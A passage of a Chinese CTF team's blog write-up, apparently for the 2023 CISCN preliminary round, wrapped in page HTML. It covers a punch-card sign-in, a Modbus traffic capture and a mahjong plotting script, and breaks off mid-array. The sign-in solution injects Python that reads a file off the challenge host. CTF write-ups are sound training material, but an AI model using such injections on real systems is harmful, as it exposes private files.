@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 5.4.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hackerone-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hackerone-16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="msvalidate.01" content="237E6FD4C952815B9A0DDB67FAB1FF12">
+  <meta name="baidu-site-verification" content="code-LhZrqnckkC">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"r30blogs.com","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="一、战队信息战队名称：R3ape1 战队排名：171 二、解题情况 三、解题过程MISC签到卡 根据提示可以知道穿孔卡片机里面执行的是python脚本，那就直接用python语句来读取flag就行 print(open(‘&#x2F;flag’).read())  得到flag，flag{3b78ec89-8a1c-424d-a9eb-97d63648846e} 被加密的生产流量 打开流量包发现是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023CISCN初赛">
+<meta property="og:url" content="https://r30blogs.com/2023/06/05/2023CISCN%E5%88%9D%E8%B5%9B/index.html">
+<meta property="og:site_name" content="R3ape1团队笔记">
+<meta property="og:description" content="一、战队信息战队名称：R3ape1 战队排名：171 二、解题情况 三、解题过程MISC签到卡 根据提示可以知道穿孔卡片机里面执行的是python脚本，那就直接用python语句来读取flag就行 print(open(‘&#x2F;flag’).read())  得到flag，flag{3b78ec89-8a1c-424d-a9eb-97d63648846e} 被加密的生产流量 打开流量包发现是">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image002.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image004.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image006.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image008.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image010.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image012.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image014.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image016.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image018.jpg">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image020.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image022.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image024.jpg">
+<meta property="og:image" content="c:/Users/16956/AppData/Local/Temp/msohtmlclip1/01/clip_image026.gif">
+<meta property="og:image" content="c:/Users/16956/AppData/Local/Temp/msohtmlclip1/01/clip_image028.jpg">
+<meta property="og:image" content="c:/Users/16956/AppData/Local/Temp/msohtmlclip1/01/clip_image030.jpg">
+<meta property="og:image" content="c:/Users/16956/AppData/Local/Temp/msohtmlclip1/01/clip_image032.jpg">
+<meta property="og:image" content="c:/Users/16956/AppData/Local/Temp/msohtmlclip1/01/clip_image034.jpg">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image036.jpg">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image038.jpg">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image040.jpg">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image042.jpg">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image044.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image046.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image048.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image050.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image052.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image054.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image056.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image058.jpg">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image060.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image062.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image064.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image066.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image068.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image070.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image072.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image074.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image076.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image078.gif">
+<meta property="article:published_time" content="2023-06-05T12:13:00.000Z">
+<meta property="article:modified_time" content="2023-06-05T12:16:12.438Z">
+<meta property="article:author" content="nnnpc、commit、Eureka">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="misc">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="re">
+<meta property="article:tag" content="crypto">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image002.gif">
+
+
+<link rel="canonical" href="https://r30blogs.com/2023/06/05/2023CISCN%E5%88%9D%E8%B5%9B/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://r30blogs.com/2023/06/05/2023CISCN%E5%88%9D%E8%B5%9B/","path":"2023/06/05/2023CISCN初赛/","title":"2023CISCN初赛"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2023CISCN初赛 | R3ape1团队笔记</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">R3ape1团队笔记</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">杭电信工笃行楼230实验室</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%88%98%E9%98%9F%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">一、战队信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E8%A7%A3%E9%A2%98%E6%83%85%E5%86%B5"><span class="nav-number">2.</span> <span class="nav-text">二、解题情况</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">三、解题过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">3.1.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0%E5%8D%A1"><span class="nav-number">3.1.1.</span> <span class="nav-text">签到卡</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%BD%E7%B2%B9"><span class="nav-number">3.1.2.</span> <span class="nav-text">国粹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pyshell"><span class="nav-number">3.1.3.</span> <span class="nav-text">pyshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">3.2.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sign-in-passwd"><span class="nav-number">3.2.1.</span> <span class="nav-text">Sign_in_passwd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E4%BF%A1%E5%BA%A6%E9%87%8F"><span class="nav-number">3.2.2.</span> <span class="nav-text">可信度量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">3.3.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ezbyte"><span class="nav-number">3.3.1.</span> <span class="nav-text">ezbyte</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babyRE"><span class="nav-number">3.3.2.</span> <span class="nav-text">babyRE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn"><span class="nav-number">3.4.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF"><span class="nav-number">3.4.1.</span> <span class="nav-text">烧烤摊儿</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#funcanary"><span class="nav-number">3.4.2.</span> <span class="nav-text">funcanary</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">3.5.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#unzip"><span class="nav-number">3.5.1.</span> <span class="nav-text">unzip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BackendService"><span class="nav-number">3.5.2.</span> <span class="nav-text">BackendService</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dumpit"><span class="nav-number">3.5.3.</span> <span class="nav-text">dumpit</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="nnnpc、commit、Eureka"
+      src="/images/head.png">
+  <p class="site-author-name" itemprop="name">nnnpc、commit、Eureka</p>
+  <div class="site-description" itemprop="description">网络信息安全，责任重大，使命光荣。</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="mailto:1695672857@qq.com" title="E-Mail → mailto:1695672857@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://r30blogs.com/2023/06/05/2023CISCN%E5%88%9D%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R3ape1团队笔记">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2023CISCN初赛 | R3ape1团队笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2023CISCN初赛
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-06-05 20:13:00 / 修改时间：20:16:12" itemprop="dateCreated datePublished" datetime="2023-06-05T20:13:00+08:00">2023-06-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="一、战队信息"><a href="#一、战队信息" class="headerlink" title="一、战队信息"></a>一、战队信息</h1><p>战队名称：R3ape1</p>
+<p>战队排名：171</p>
+<h1 id="二、解题情况"><a href="#二、解题情况" class="headerlink" title="二、解题情况"></a>二、解题情况</h1><p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image002.gif" alt="图片"></p>
+<h1 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到卡"><a href="#签到卡" class="headerlink" title="签到卡"></a>签到卡</h3><p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image004.gif" alt="图片"></p>
+<p>根据提示可以知道穿孔卡片机里面执行的是python脚本，那就直接用python语句来读取flag就行</p>
+<p>print(open(‘&#x2F;flag’).read())</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image006.gif" alt="图片"></p>
+<p>得到flag，<strong>flag{3b78ec89-8a1c-424d-a9eb-97d63648846e}</strong></p>
+<p>被加密的生产流量</p>
+<p>打开流量包发现是modbus协议，还查找了许多资料，但其实flag直接追踪tcp流就可</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image008.gif" alt="图片"></p>
+<p>在0流获取base32编码拼接，解码得到flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image010.gif" alt="图片"></p>
+<p><strong>flag{c1f_fi1g_1000}</strong></p>
+<h3 id="国粹"><a href="#国粹" class="headerlink" title="国粹"></a>国粹</h3><p>附件得到三张图片</p>
+<p>其中题目.png作为每一块麻将所代表的数字，按顺序标记一下</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image012.gif" alt="图片"></p>
+<p>a.png和k.png分别作为横纵坐标，用python脚本打点画一个坐标图</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image014.gif" alt="图片"></p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image016.gif" alt="图片"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line">x = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">12</span>,<span class="number">12</span>,<span class="number">12</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">14</span>,<span class="number">14</span>,<span class="number">14</span>,<span class="number">14</span>,<span class="number">14</span>,<span class="number">14</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">15</span>,<span class="number">15</span>,<span class="number">15</span>,<span class="number">15</span>,<span class="number">15</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">16</span>,<span class="number">16</span>,<span class="number">16</span>,<span class="number">16</span>,<span class="number">16</span>,<span class="number">16</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">18</span>,<span class="number">18</span>,<span class="number">18</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">29</span>,<span class="number">29</span>,<span class="number">29</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">38</span>,<span class="number">39</span>,<span class="number">39</span>,<span class="number">39</span>]</span><br><span class="line"></span><br><span class="line">y = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">16.17</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">18</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">25</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">25</span>,<span class="number">29</span>,<span class="number">34</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">25</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">22</span>,<span class="number">24</span>,<span class="number">22</span>,<span 